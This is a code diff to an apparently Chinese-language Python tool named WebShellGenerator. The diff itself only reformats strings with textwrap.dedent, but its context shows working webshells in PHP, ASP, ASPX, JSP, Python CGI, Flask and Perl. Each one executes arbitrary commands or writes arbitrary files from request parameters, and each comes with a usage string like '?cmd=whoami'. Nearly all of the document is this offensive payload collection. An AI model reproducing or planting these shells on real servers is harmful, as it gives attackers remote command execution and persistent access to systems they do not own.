@@ -7,6 +7,7 @@ WebShell生成器 - 生成各种语言的webshell
 import base64
 import random
 import string
+import textwrap
 
 
 class WebShellGenerator:
@@ -60,12 +61,13 @@ class WebShellGenerator:
             },
             "file_put_shell": {
                 "name": "File Put Contents Shell",
-                "code": """<?php 
+                "code": textwrap.dedent("""\
+                <?php 
                 $file = $_REQUEST['f']; 
                 $content = $_REQUEST['c']; 
                 file_put_contents($file, base64_decode($content)); 
                 echo 'OK';
-                ?>""",
+                ?>"""),
                 "usage": "?f=shell.php&c=base64_content"
             },
             "mini_shell": {
@@ -80,7 +82,8 @@ class WebShellGenerator:
             },
             "advanced_shell": {
                 "name": "高级WebShell",
-                "code": """<?php
+                "code": textwrap.dedent("""\
+                <?php
                 if(isset($_REQUEST['cmd'])){
                     $cmd = ($_REQUEST['cmd']);
                     system($cmd);
@@ -93,7 +96,7 @@ class WebShellGenerator:
                     move_uploaded_file($file, $name);
                     echo "Uploaded: $name";
                 }
-                ?>""",
+                ?>"""),
                 "usage": "?cmd=whoami 或 ?upload=1 (POST file)"
             },
             "bypass_shell": {
@@ -118,7 +121,8 @@ class WebShellGenerator:
             },
             "execute_asp": {
                 "name": "Execute Shell",
-                "code": """<%
+                "code": textwrap.dedent("""\
+                <%
                 Dim cmd
                 cmd = Request.QueryString("cmd")
                 If cmd <> "" Then
@@ -128,12 +132,13 @@ class WebShellGenerator:
                     Set exec = wsh.Exec(cmd)
                     Response.Write(exec.StdOut.ReadAll)
                 End If
-                %>""",
+                %>"""),
                 "usage": "?cmd=whoami"
             },
             "aspx_shell": {
                 "name": "ASPX Shell",
-                "code": """<%@ Page Language="C#" %>
+                "code": textwrap.dedent("""\
+                <%@ Page Language="C#" %>
                 <%@ Import Namespace="System.Diagnostics" %>
                 <%
                 string cmd = Request.QueryString["cmd"];
@@ -147,16 +152,17 @@ class WebShellGenerator:
                     p.Start();
                     Response.Write(p.StandardOutput.ReadToEnd());
                 }
-                %>""",
+                %>"""),
                 "usage": "?cmd=whoami"
             },
             "cmd_asp": {
                 "name": "CMD执行Shell",
-                "code": """<%
+                "code": textwrap.dedent("""\
+                <%
                 Set shell = CreateObject("WScript.Shell")
                 Set cmd = shell.Exec(Request("cmd"))
                 Response.Write cmd.StdOut.ReadAll()
-                %>""",
+                %>"""),
                 "usage": "POST: cmd=whoami"
             }
         }
@@ -166,7 +172,8 @@ class WebShellGenerator:
         return {
             "simple_jsp": {
                 "name": "简单JSP Shell",
-                "code": """<%@ page import="java.io.*" %>
+                "code": textwrap.dedent("""\
+                <%@ page import="java.io.*" %>
                 <%
                 String cmd = request.getParameter("cmd");
                 if (cmd != null) {
@@ -177,12 +184,13 @@ class WebShellGenerator:
                         out.println(line);
                     }
                 }
-                %>""",
+                %>"""),
                 "usage": "?cmd=whoami"
             },
             "process_builder": {
                 "name": "Process Builder Shell",
-                "code": """<%@ page import="java.io.*,java.util.*" %>
+                "code": textwrap.dedent("""\
+                <%@ page import="java.io.*,java.util.*" %>
                 <%
                 String[] cmds = request.getParameterValues("cmd");
                 if (cmds != null) {
@@ -195,12 +203,13 @@ class WebShellGenerator:
                         out.println(line + "<br>");
                     }
                 }
-                %>""",
+                %>"""),
                 "usage": "?cmd=/bin/sh&cmd=-c&cmd=whoami"
             },
             "advanced_jsp": {
                 "name": "高级JSP Shell",
-                "code": """<%@ page import="java.io.*,java.net.*" %>
+                "code": textwrap.dedent("""\
+                <%@ page import="java.io.*,java.net.*" %>
                 <%
                 String cmd = request.getParameter("cmd");
                 if (cmd != null) {
@@ -221,7 +230,7 @@ class WebShellGenerator:
                     fw.close();
                     out.println("File written: " + file);
                 }
-                %>""",
+                %>"""),
                 "usage": "?cmd=whoami 或 ?upload=1&file=test.txt&content=test"
             }
         }
@@ -231,7 +240,8 @@ class WebShellGenerator:
         return {
             "cgi_shell": {
                 "name": "CGI Shell",
-                "code": """#!/usr/bin/env python3
+                "code": textwrap.dedent("""\
+                #!/usr/bin/env python3
                 import os
                 import cgi
                 import subprocess
@@ -247,12 +257,13 @@ class WebShellGenerator:
                         print(result.decode('utf-8'))
                     except Exception as e:
                         print(str(e))
-                """,
+                """),
                 "usage": "?cmd=whoami"
             },
             "flask_shell": {
                 "name": "Flask Shell",
-                "code": """from flask import Flask, request
+                "code": textwrap.dedent("""\
+                from flask import Flask, request
                 import subprocess
                 
                 app = Flask(__name__)
@@ -266,7 +277,7 @@ class WebShellGenerator:
                 
                 if __name__ == '__main__':
                     app.run()
-                """,
+                """),
                 "usage": "/shell?cmd=whoami"
             }
         }
@@ -276,7 +287,8 @@ class WebShellGenerator:
         return {
             "cgi_perl": {
                 "name": "CGI Perl Shell",
-                "code": """#!/usr/bin/perl
+                "code": textwrap.dedent("""\
+                #!/usr/bin/perl
                 use CGI;
                 my $q = CGI->new;
                 my $cmd = $q->param('cmd');
@@ -284,7 +296,7 @@ class WebShellGenerator:
                 if ($cmd) {
                     print `$cmd`;
                 }
-                """,
+                """),
                 "usage": "?cmd=whoami"
             }
         }
